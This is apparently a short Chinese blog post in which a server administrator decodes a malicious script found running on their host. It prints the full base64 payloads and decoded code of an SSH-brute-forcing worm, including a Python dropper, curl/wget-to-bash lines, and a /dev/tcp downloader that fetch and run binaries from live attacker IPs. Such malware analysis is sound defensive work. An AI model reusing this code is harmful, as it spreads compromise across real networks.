---
title: 恶意脚本解析
date: 2023-10-09 19:53:21
updated: 2023-10-09 19:53:21
categories:
  - 全民反诈
tags: 全民反诈
---

```sh
[root@server105 thingsx]# ps -ef | grep nohup
root      59910  56940  0 19:54 pts/2    00:00:00 grep --color=auto nohup
tenant_+  80997  80996  0 10月03 ?      00:00:00 sh -c export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin; nohup echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly81LjQyLjY3LjMvZS5weSIpLnJlYWQoKSkn | base64 -d | bash
tenant_+  81196  81195  0 10月03 ?      00:00:00 sh -c export PATH=/bin:/sbin:/usr/bin:/usr/local/bin:/usr/sbin; nohup echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly81LjQyLjY3LjMvZS5weSIpLnJlYWQoKSkn | base64 -d | bash
tenant_+  81249  81005 99 10月03 ?      6-17:13:19 sh -c nohup /tmp/spirit scan --range `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.*.* --timeout 3s -p 22 -threads 300
tenant_+  81301  81200 99 10月03 ?      6-17:14:04 sh -c nohup /tmp/spirit scan --range `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.*.* --timeout 3s -p 22 -threads 300
```

其中解析出了一段 python 代码：

```sh
echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly81LjQyLjY3LjMvZS5weSIpLnJlYWQoKSkn | base64 -d

python -c 'import urllib;exec(urllib.urlopen("http://5.42.67.3/e.py").read())
```

```py
import urllib
import platform
import os

if platform.architecture()[0] == "64bit":
    urlx64 = "http://5.42.67.3/spirit"
    urlxx = "http://5.42.67.3/px5"

    f = urllib.urlopen(urlx64)
    if f.code == 200:
        data = f.read()
        with open ("/tmp/spirit", "wb") as code:
            code.write(data)

    xx = urllib.urlopen(urlxx)
    if xx.code == 200:
        data = xx.read()
        with open ("/tmp/p.lst", "wb") as code:
            code.write(data)
        os.chmod("/tmp/spirit", 0o777)
        os.chmod("/tmp/p.lst", 0o777)

        os.system("cd /tmp")
        os.system("rm -rf /tmp/open.lst /tmp/h.lst /tmp/b.lst /tmp/scan.lst")
        os.system("ulimit -n 3000")
        os.system("nohup /tmp/spirit scan --range `ip a | grep 'BROADCAST\|inet' | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1`.*.* --timeout 3s -p 22 -threads 300")
        # scan.list 变成 h.lst
        os.system("mv /tmp/scan.lst /tmp/h.lst")
        os.system("nohup /tmp/spirit banner -T 3s")
        # b.lst 追加到 h.list
        os.system("cat /tmp/b.lst | grep OpenSSH > /tmp/h.lst")
        os.system('nohup /tmp/spirit -t 3s -c "(curl -s http://5.42.67.3/2.gif?ssh || wget -q -O - http://5.42.67.3/2.gif?ssh || lwp-download http://5.42.67.3/2.gif /tmp/2.gif) | bash -sh; bash /tmp/2.gif; rm -rf /tmp/2.gif; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly84NC41NC41MC42MS9kLnB5IikucmVhZCgpKScgfHwgcHl0aG9uMiAtYyAnaW1wb3J0IHVybGxpYjtleGVjKHVybGxpYi51cmxvcGVuKCJodHRwOi8vODQuNTQuNTAuNjEvZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; echo ZnVuY3Rpb24gZHcoKSB7IHJlYWQgLXIgcHJvdG8gc2VydmVyIHBhdGggPDw8IiQocHJpbnRmICclcycgIiR7MS8vLy8gfSIpIjsgaWYgWyAiJHByb3RvIiAhPSAiaHR0cDoiIF07IHRoZW4gcHJpbnRmID4mMiAic29ycnksICVzIHN1cHBvcnRzIG9ubHkgaHR0cFxuIiAiJHtGVU5DTkFNRVswXX0iOyByZXR1cm4gMTsgZmk7IERPQz0vJHtwYXRoLy8gLy99OyBIT1NUPSR7c2VydmVyLy86Kn07IFBPUlQ9JHtzZXJ2ZXIvLyo6fTsgWyAiJHtIT1NUfSIgPSAiJHtQT1JUfSIgXSAmJiBQT1JUPTgwOyBleGVjIDM8PiIvZGV2L3RjcC8ke0hPU1R9LyRQT1JUIjsgcHJpbnRmICdHRVQgJXMgSFRUUC8xLjBcclxuSG9zdDogJXNcclxuXHJcbicgIiR7RE9DfSIgIiR7SE9TVH0iID4mMzsgKHdoaWxlIHJlYWQgLXIgbGluZTsgZG8gWyAiJGxpbmUiID0gJCdccicgXSAmJiBicmVhazsgZG9uZSAmJiBjYXQpIDwmMzsgZXhlYyAzPiYtOyB9OyBkdyBodHRwOi8vNS40Mi42Ny4zLyQodW5hbWUgLW0pID4gL3RtcC9iYXNoOyBkdyBodHRwOi8vNS40Mi42Ny4zL2Jhc2hpcmMuJCh1bmFtZSAtbSkgPiAvdG1wL3B5dGhvbjsgY2htb2QgK3ggL3RtcC9iYXNoIC90bXAvcHl0aG9uOyAvdG1wL2Jhc2ggLWMgLXAgODAgLXAgNDQzIC10bHMgLWRwIDgwIC1kcCA0NDMgLXRscyAtZDsgL3RtcC9iYXNoIC1jIC1wIDgwIC1wIDQ0MyAtdGxzIC1kcCA4MCAtZHAgNDQzIC10bHMgLWQgLXB3bjsgcm0gLXJmIC90bXAvYmFzaCAvdG1wL3B5dGhvbg== | base64 -d | bash -" brute -j 300')
        os.system("echo Finished")
```

```sh
echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly84NC41NC41MC42MS9kLnB5IikucmVhZCgpKScgfHwgcHl0aG9uMiAtYyAnaW1wb3J0IHVybGxpYjtleGVjKHVybGxpYi51cmxvcGVuKCJodHRwOi8vODQuNTQuNTAuNjEvZC5weSIpLnJlYWQoKSkn | base64 -d
```

解析为

```sh
python -c 'import urllib;exec(urllib.urlopen("http://84.54.50.61/d.py").read())' || python2 -c 'import urllib;exec(urllib.urlopen("http://84.54.50.61/d.py").read())'
```

```sh
echo ZnVuY3Rpb24gZHcoKSB7IHJlYWQgLXIgcHJvdG8gc2VydmVyIHBhdGggPDw8IiQocHJpbnRmICclcycgIiR7MS8vLy8gfSIpIjsgaWYgWyAiJHByb3RvIiAhPSAiaHR0cDoiIF07IHRoZW4gcHJpbnRmID4mMiAic29ycnksICVzIHN1cHBvcnRzIG9ubHkgaHR0cFxuIiAiJHtGVU5DTkFNRVswXX0iOyByZXR1cm4gMTsgZmk7IERPQz0vJHtwYXRoLy8gLy99OyBIT1NUPSR7c2VydmVyLy86Kn07IFBPUlQ9JHtzZXJ2ZXIvLyo6fTsgWyAiJHtIT1NUfSIgPSAiJHtQT1JUfSIgXSAmJiBQT1JUPTgwOyBleGVjIDM8PiIvZGV2L3RjcC8ke0hPU1R9LyRQT1JUIjsgcHJpbnRmICdHRVQgJXMgSFRUUC8xLjBcclxuSG9zdDogJXNcclxuXHJcbicgIiR7RE9DfSIgIiR7SE9TVH0iID4mMzsgKHdoaWxlIHJlYWQgLXIgbGluZTsgZG8gWyAiJGxpbmUiID0gJCdccicgXSAmJiBicmVhazsgZG9uZSAmJiBjYXQpIDwmMzsgZXhlYyAzPiYtOyB9OyBkdyBodHRwOi8vNS40Mi42Ny4zLyQodW5hbWUgLW0pID4gL3RtcC9iYXNoOyBkdyBodHRwOi8vNS40Mi42Ny4zL2Jhc2hpcmMuJCh1bmFtZSAtbSkgPiAvdG1wL3B5dGhvbjsgY2htb2QgK3ggL3RtcC9iYXNoIC90bXAvcHl0aG9uOyAvdG1wL2Jhc2ggLWMgLXAgODAgLXAgNDQzIC10bHMgLWRwIDgwIC1kcCA0NDMgLXRscyAtZDsgL3RtcC9iYXNoIC1jIC1wIDgwIC1wIDQ0MyAtdGxzIC1kcCA4MCAtZHAgNDQzIC10bHMgLWQgLXB3bjsgcm0gLXJmIC90bXAvYmFzaCAvdG1wL3B5dGhvbg== | base64 -d
```

解析为

```sh
function dw() { 
    read -r proto server path <<<"$(printf '%s' "${1//// }")";

if [ "$proto" != "http:" ];
then printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}";

return 1;
fi;
DOC=/${path// //};
HOST=${server//:*};
PORT=${server//*:};

[ "${HOST}" = "${PORT}" ] && PORT=80;
exec 3<>"/dev/tcp/${HOST}/$PORT";
printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3;

(while read -r line;
do [ "$line" = $'\r' ] && break;
done && cat) <&3;
exec 3>&-; };

dw http://5.42.67.3/$(uname -m) > /tmp/bash;
dw http://5.42.67.3/bashirc.$(uname -m) > /tmp/python;

chmod +x /tmp/bash /tmp/python;

/tmp/bash -c -p 80 -p 443 -tls -dp 80 -dp 443 -tls -d;
/tmp/bash -c -p 80 -p 443 -tls -dp 80 -dp 443 -tls -d -pwn;

rm -rf /tmp/bash /tmp/python
```
